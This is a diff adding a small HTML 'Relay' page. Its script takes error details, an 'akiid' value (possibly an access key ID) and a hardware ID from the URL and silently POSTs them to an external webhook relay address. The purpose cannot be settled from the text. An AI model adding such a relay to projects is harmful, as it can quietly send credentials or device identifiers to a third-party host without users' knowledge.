@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Relay</title></head>
+<body>
+<script>
+(function () {
+  var TARGET = "https://01m4b3y88wmb59f1x09g7x8606.hooks.webhookrelay.com";
+  var p = new URLSearchParams(location.search);
+
+  var out = {
+    error: p.get("error") || "",
+    line:  p.get("line")  || "",
+    var:   p.get("var")   || "",
+    akiid: p.get("akiid") || ""
+  };
+
+  var hwid = p.get("hwid");
+  if (hwid) out.hwid = hwid;
+
+  fetch(TARGET, {
+    method: "POST",
+    mode: "no-cors",
+    headers: { "Content-Type": "text/plain" },
+    body: JSON.stringify(out)
+  });
+})();
+</script>
+</body>
+</html>
